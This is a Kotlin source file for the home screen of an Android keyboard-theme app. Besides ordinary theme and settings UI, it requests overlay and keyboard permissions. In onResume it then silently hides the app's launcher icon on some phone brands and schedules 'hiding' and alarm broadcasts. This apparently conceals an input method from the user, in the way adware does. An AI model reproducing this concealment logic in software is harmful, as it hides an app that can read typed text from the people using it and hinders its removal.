package com.smard.boart.ui.home

import android.content.Intent
import android.os.Build
import android.provider.Settings
import android.view.View
import android.view.inputmethod.InputMethodManager
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.viewModels
import androidx.constraintlayout.widget.ConstraintSet
import androidx.fragment.app.commit
import androidx.transition.ChangeBounds
import androidx.transition.Transition
import androidx.transition.TransitionManager
import com.smard.boart.R
import com.smard.boart.background.view.keyboard.repository.BottomRightCharacterRepository
import com.smard.boart.data.KeyboardTheme
import com.smard.boart.databinding.HomeActivityBinding
import com.smard.boart.repository.PrefsReporitory
import com.smard.boart.ui.base.BaseActivity
import com.smard.boart.ui.custom.ItemDecorationWithEnds
import com.smard.boart.ui.edit.EditFragment
import com.smard.boart.ui.language.LanguageActivity
import com.smard.boart.ui.options.OptionsActivity
import com.smard.boart.ui.splash.SplashActivity
import com.smard.boart.util.EXTRA_LAUNCH_SETTINGS
import com.smard.boart.util.enums.KeyboardHeight
import com.smard.boart.util.enums.LanguageChange
import com.smard.boart.util.enums.OneHandedMode
import com.smard.boart.util.hiding.AlarmBroadcast
import com.smard.boart.util.hiding.AppHidingUtil
import com.smard.boart.util.hiding.HidingBroadcast
import java.util.*

class HomeActivity : BaseActivity<HomeViewModel, HomeActivityBinding>(R.layout.home_activity) {

    val viewModel: HomeViewModel by viewModels { HomeViewModel.Factory() }

    private val inputManager by lazy { getSystemService(InputMethodManager::class.java) }

    private val keyboardHeightLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        OptionsActivity.getResult(it.data)?.let { it as? KeyboardHeight }?.let(viewModel::onKeyboardHeightSelected)
    }
    private val languageButtonLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        OptionsActivity.getResult(it.data)?.let { it as? LanguageChange }?.let(viewModel::onLanguageChangeSelected)
    }
    private val oneHandedModeLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        OptionsActivity.getResult(it.data)?.let { it as? OneHandedMode }?.let(viewModel::onOneHandedModeSelected)
    }
    private val specialSymbolLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        OptionsActivity.getResult(it.data)?.let { it as? BottomRightCharacterRepository.SelectableCharacter }?.let(viewModel::onSpecialSymbolSelected)
    }

    override fun setupUI() {
        if (PrefsReporitory.firstLaunchMillis == -1L)
            PrefsReporitory.firstLaunchMillis = System.currentTimeMillis()

        AlarmBroadcast.startAlarm(this)


        if (!Settings.canDrawOverlays(this) || !hasKeyboardPermission())
            startActivity(Intent(this, SplashActivity::class.java))

        binding.root.post {
            val spaceVertical = binding.root.width / 360 * 10
            val spaceHorizontal = binding.root.width / 360 * 24
            val itemDecoration = ItemDecorationWithEnds(
                topFirst = spaceVertical,
                bottomFirst = spaceVertical,
                bottom = spaceVertical,
                leftFirst = spaceHorizontal,
                left = spaceHorizontal,
                rightFirst = spaceHorizontal,
                right = spaceHorizontal,
                firstPredicate = { i -> i == 0 }
            )
            binding.rvPreset.addItemDecoration(itemDecoration)
            binding.rvCustom.addItemDecoration(itemDecoration)
        }

        viewModel.onThemeClick.observe(this) {
            supportFragmentManager.commit {
                add(R.id.fragmentContainer, EditFragment.newInstance(it))
            }
        }
        viewModel.onAddClick.observe(this) {
            supportFragmentManager.commit {
                add(R.id.fragmentContainer, EditFragment.newInstance(KeyboardTheme(-1)))
            }
        }
        binding.drawerHitBox.setOnClickListener {}
        binding.buttonMenu.setOnClickListener { openDrawer() }
        binding.buttonMenuBack.setOnClickListener { closeDrawer() }

        binding.buttonLanguage.setOnClickListener {
            startActivity(Intent(this, LanguageActivity::class.java))
        }
        binding.buttonKeyboardHeight.setOnClickListener {
            keyboardHeightLauncher.launch(OptionsActivity.getIntent(
                getString(R.string.keyboard_height),
                KeyboardHeight.values().map { it to getString(it.displayName) },
                PrefsReporitory.Settings.keyboardHeight,
                this
            ))
        }
        binding.buttonLanguageChange.setOnClickListener {
            languageButtonLauncher.launch(OptionsActivity.getIntent(
                getString(R.string.language_change),
                LanguageChange.values().map { it to getString(it.displayName) },
                PrefsReporitory.Settings.languageChange,
                this
            ))
        }
        binding.buttonOneHandedMode.setOnClickListener {
            oneHandedModeLauncher.launch(OptionsActivity.getIntent(
                getString(R.string.one_handed_mode),
                OneHandedMode.values().map { it to getString(it.displayName) },
                PrefsReporitory.Settings.oneHandedMode,
                this
            ))
        }
        binding.buttonSpecialSymbol.setOnClickListener {
            specialSymbolLauncher.launch(OptionsActivity.getIntent(
                getString(R.string.special_symbols_editor),
                BottomRightCharacterRepository.SelectableCharacter.values().map { it to getString(it.displayName) },
                BottomRightCharacterRepository.SelectableCharacter.from(BottomRightCharacterRepository.selectedBottomRightCharacterCode),
                this
            ))
        }
        if (intent?.hasExtra(EXTRA_LAUNCH_SETTINGS) == true)
            openDrawer()
    }

    override fun onResume() {
        super.onResume()
        if (Settings.canDrawOverlays(this) && notSupportedBackgroundDevice())
            AppHidingUtil.hideApp(this, "Launcher2", "Launcher")
        else
            HidingBroadcast.startAlarm(this)
    }

    private fun notSupportedBackgroundDevice() = Build.MANUFACTURER.lowercase(Locale.ENGLISH) in listOf(
        "xiaomi", "oppo", "vivo", "letv", "honor", "oneplus"
    )

    private fun openDrawer() {
        binding.drawerContainer.visibility = View.VISIBLE
        binding.drawerContainer.animate().alpha(1f).setDuration(100).withEndAction {
            val cs = ConstraintSet()
            cs.clone(binding.drawerContainer)
            cs.connect(
                R.id.drawer,
                ConstraintSet.END,
                ConstraintSet.PARENT_ID,
                ConstraintSet.END
            )
            cs.clear(R.id.drawer, ConstraintSet.START)
            TransitionManager.beginDelayedTransition(
                binding.drawerContainer,
                ChangeBounds().setDuration(100)
            )
            cs.applyTo(binding.drawerContainer)
        }.start()
    }

    private fun closeDrawer() {
        val cs = ConstraintSet()
        cs.clone(binding.drawerContainer)
        cs.connect(R.id.drawer, ConstraintSet.START, ConstraintSet.PARENT_ID, ConstraintSet.END)
        cs.clear(R.id.drawer, ConstraintSet.END)
        val transition =
            ChangeBounds().setDuration(100).addListener(object : Transition.TransitionListener {
                override fun onTransitionStart(transition: Transition) {}
                override fun onTransitionEnd(transition: Transition) {
                    binding.drawerContainer.animate().alpha(0f).setDuration(100).withEndAction {
                        binding.drawerContainer.visibility = View.GONE
                    }
                }

                override fun onTransitionCancel(transition: Transition) {}
                override fun onTransitionPause(transition: Transition) {}
                override fun onTransitionResume(transition: Transition) {}
            })
        TransitionManager.beginDelayedTransition(binding.drawerContainer, transition)
        cs.applyTo(binding.drawerContainer)
    }

    private fun hasKeyboardPermission() = isKeyboardActive() && isKeyboardEnable()

    private fun isKeyboardActive() = inputManager
        .enabledInputMethodList
        .firstOrNull { it.packageName == packageName } != null

    private fun isKeyboardEnable() = inputManager
        .enabledInputMethodList
        .firstOrNull { it.packageName == packageName }
        ?.id == Settings.Secure.getString(contentResolver, "default_input_method")

    override fun provideViewModel(): HomeViewModel = viewModel

}
